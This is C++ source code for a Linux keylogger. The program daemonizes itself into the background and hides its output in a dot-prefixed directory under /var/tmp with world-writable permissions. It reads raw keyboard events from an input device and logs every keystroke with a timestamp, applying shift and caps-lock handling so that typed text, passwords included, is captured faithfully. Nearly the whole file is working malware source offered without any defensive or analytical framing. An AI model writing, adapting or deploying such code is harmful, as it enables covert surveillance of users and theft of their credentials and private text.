#include <iostream>
#include <fstream>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <signal.h>
#include <time.h>
#include <map>
#include <algorithm>

using namespace std;

map<int, string> keyMap = {
    {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"}, {KEY_E, "e"},
    {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"}, {KEY_I, "i"}, {KEY_J, "j"},
    {KEY_K, "k"}, {KEY_L, "l"}, {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"},
    {KEY_P, "p"}, {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
    {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"}, {KEY_Y, "y"},
    {KEY_Z, "z"}, {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"},
    {KEY_5, "5"}, {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"},
    {KEY_0, "0"}, {KEY_SPACE, " "}, {KEY_ENTER, "[ENTER]"},
    {KEY_BACKSPACE, "[BACKSPACE]"}, {KEY_TAB, "[TAB]"}, {KEY_ESC, "[ESC]"},
    {KEY_F1, "[F1]"}, {KEY_F2, "[F2]"}, {KEY_F3, "[F3]"}, {KEY_F4, "[F4]"},
    {KEY_F5, "[F5]"}, {KEY_F6, "[F6]"}, {KEY_F7, "[F7]"}, {KEY_F8, "[F8]"},
    {KEY_F9, "[F9]"}, {KEY_F10, "[F10]"}, {KEY_F11, "[F11]"}, {KEY_F12, "[F12]"}
};

map<int, string> shiftMap = {
    {KEY_1, "!"}, {KEY_2, "@"}, {KEY_3, "#"}, {KEY_4, "$"},
    {KEY_5, "%"}, {KEY_6, "^"}, {KEY_7, "&"}, {KEY_8, "*"},
    {KEY_9, "("}, {KEY_0, ")"}, {KEY_MINUS, "_"}, {KEY_EQUAL, "+"},
    {KEY_LEFTBRACE, "{"}, {KEY_RIGHTBRACE, "}"}, {KEY_BACKSLASH, "|"},
    {KEY_SEMICOLON, ":"}, {KEY_APOSTROPHE, "\""}, {KEY_COMMA, "<"},
    {KEY_DOT, ">"}, {KEY_SLASH, "?"}
};

bool shiftPressed = false;
bool capsLockOn = false;

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); 

    umask(0);
    if (setsid() < 0) exit(EXIT_FAILURE);

    if (mkdir("/var/tmp/.hidden_keylog/", 0777) == -1 && errno != EEXIST) {
        perror("Error creating directory");
        exit(EXIT_FAILURE);
    }

    if (chdir("/var/tmp/.hidden_keylog/") != 0) {
        perror("Error changing directory");
        exit(EXIT_FAILURE);
    }

    freopen("/dev/null", "r", stdin);
    freopen("/var/tmp/.hidden_keylog/log.txt", "w", stdout);
    freopen("/var/tmp/.hidden_keylog/log.txt", "w", stderr);
}

int main() {
    daemonize(); 

    mkdir("/var/tmp/.hidden_keylog/", 0777);
    ofstream logFile("/var/tmp/.hidden_keylog/keylog.txt", ios::app);
    if (!logFile) return 1;

    const char* device = "/dev/input/event2"; 
    int fd = open(device, O_RDONLY);
    if (fd == -1) return 1;

    logFile << "\n[Keylogger Started]\n";
    logFile.flush();

    struct input_event event;
    while (true) {
        read(fd, &event, sizeof(event));

        if (event.type == EV_KEY) {
            if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                shiftPressed = (event.value != 0); 
            } else if (event.code == KEY_CAPSLOCK && event.value == 1) {
                capsLockOn = !capsLockOn; 
            } else if (event.value == 1) { 
                time_t now = time(0);
                tm* localTime = localtime(&now);
                logFile << "[" << localTime->tm_hour << ":" << localTime->tm_min << ":" << localTime->tm_sec << "] ";

                
                if (shiftPressed && shiftMap.find(event.code) != shiftMap.end()) {
                    logFile << shiftMap[event.code];  
                } else if (keyMap.find(event.code) != keyMap.end()) {
                    string key = keyMap[event.code];
                    
                    
                    if (key.length() == 1 && isalpha(key[0])) {
                        if (capsLockOn ^ shiftPressed) {
                            transform(key.begin(), key.end(), key.begin(), ::toupper);
                        } else {
                            transform(key.begin(), key.end(), key.begin(), ::tolower);
                        }
                    }

                    logFile << key;
                } else {
                    logFile << "[UNKNOWN_KEY_" << event.code << "]";
                }

                logFile << endl;
                logFile.flush();
            }
        }
    }

    logFile.close();
    close(fd);
    return 0;
}
